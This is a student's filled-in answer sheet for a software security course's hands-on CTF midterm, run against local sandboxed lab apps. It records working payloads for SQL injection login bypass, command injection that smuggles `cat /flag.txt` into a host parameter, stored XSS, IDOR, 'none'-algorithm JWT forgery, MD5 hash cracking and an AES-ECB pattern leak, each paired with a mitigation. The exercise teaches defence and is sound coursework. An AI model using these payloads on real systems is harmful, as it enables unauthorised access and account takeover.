# Midterm — Hands-on CTF Practical (Week 9)

**Course:** Software Security (KOSEN69) · **Covers:** Weeks 1–6
**Time:** 150 min · **Total:** 100 pts · **Individual** · Sandbox targets only (ethics policy applies).

**Name:** Pirisa Kitichai **Student ID:** 6631503031

> Each challenge yields a **flag** in the form `FLAG{...}` (or the proof noted). Submit, per challenge: the **flag**, the **payload/command** you used, and a **one-line mitigation**. Partial credit for documented progress without the flag.

![A CTF scoreboard diagram showing the Week 9 midterm practical's four graded categories, their point weights, source labs, the mechanism each flag actually tests, and their link to the Week 8 written exam sections.](img/ctf-categories.svg)

**Targets (started by the instructor):**
- Injection / Auth: `labs/week04-injection` and `labs/week06-authn-authz` apps (`docker compose up`)
- XSS: `labs/week05-xss-client-side` app
- Crypto: `labs/week03-cryptography` (`hashes.txt`, the ECB oracle)

---

## Challenges

| # | Title | Topic | Pts |
|---|-------|-------|-----|
| 1 | **Boolean Bypass** — log in as `admin` without the password | SQLi (W4) | 15 |
| 2 | **Shell Out** — read a file via the `host` parameter | Command injection (W4) | 15 |
| 3 | **Pop the Alert** — fire `alert(document.domain)` stored for another user | Stored XSS (W5) | 15 |
| 4 | **Not Your Order** — read another user's order object | IDOR (W6) | 15 |
| 5 | **Forge Ahead** — become admin with a forged JWT | Broken JWT (W6) | 15 |
| 6 | **Crack It** — recover a password from a weak hash | Crypto (W3) | 15 |
| 7 | **Penguin** — recover the plaintext structure from the ECB oracle | Crypto (W3) | 10 |

**Submission table (fill in):**

| # | Flag / proof | Payload or command | Mitigation (1 line) |
|---|---|---|---|
| 1 | "Welcome admin" — logged in as admin with no valid password | `GET /login?user=admin'--&pw=x` | Use parameterized queries so input is always bound as data, never SQL syntax. |
| 2 | `FLAG{cmdi_demo}` | `GET /ping?host=127.0.0.1;cat /flag.txt` | Avoid `shell=True`; pass command args as a list with strict input validation. |
| 3 | Alert popup displayed `localhost` (document.domain) | `curl -d 'body=<script>alert(document.domain)</script>' http://localhost:8080/comments` | Apply contextual output encoding / autoescaping to all user input rendered into HTML. |
| 4 | `FLAG{idor_demo}` | `curl http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"` (alice's own token) | Add a server-side ownership check comparing the authenticated user to the resource owner. |
| 5 | `FLAG{jwt_demo}` | `curl http://localhost:8080/api/admin -H "Authorization: Bearer $FORGED"` (forged with `jwt.encode({'sub':'admin'}, key='', algorithm='none')`) | Never accept `"none"` in the algorithms list; pin verification to one expected algorithm. |
| 6 | `5f4dcc3b5aa765d61d8327deb882cf99` → `password` (also recovered `123456`, `123456789`) | `hashcat.exe -m 0 hashes.txt example.dict` | Use a slow, salted KDF (Argon2id) instead of unsalted MD5 for password storage. |
| 7 | *(fill in yourself — see note below)* | `encrypt_ecb(b"A"*16 + b"A"*16)` | AES-ECB leaks structure; use an authenticated mode like AES-GCM instead. |
---
## Challenge 7 — Penguin (10 pts)

**Payload/command used:**
```python
from vulnerable_crypto import encrypt_ecb
print(encrypt_ecb(b"A"*16 + b"A"*16).hex())
```

**Evidence — raw ciphertext (hex):**
3bfd04cc0d7ed55358e2cbe19de213833bfd04cc0d7ed55358e2cbe19de21383377222e061a924c591cd9c27ea163ed4

**Evidence — split into 16-byte (32 hex char) blocks:**
Block 1: 3bfd04cc0d7ed55358e2cbe19de21383
Block 2: 3bfd04cc0d7ed55358e2cbe19de21383
Block 3: 377222e061a924c591cd9c27ea163ed4

**Proof / observation:**  
Block 1 and Block 2 are identical because both plaintext blocks contain `A` × 16. Therefore, ECB produces the same ciphertext for both blocks.

**Mechanism:**  
ECB encrypts each plaintext block independently using the same key. Because there is no chaining or random IV between blocks, identical plaintext blocks produce identical ciphertext blocks, which can reveal repeated patterns in the original data.

**Mitigation:**  
Use an authenticated encryption mode such as AES-GCM with a unique nonce instead of ECB. This prevents repeated plaintext blocks from producing the same visible ciphertext pattern and also provides integrity protection.

*Rules:* no collaboration; attack only the provided targets; document your steps. Pairs with the Week 8 written midterm.
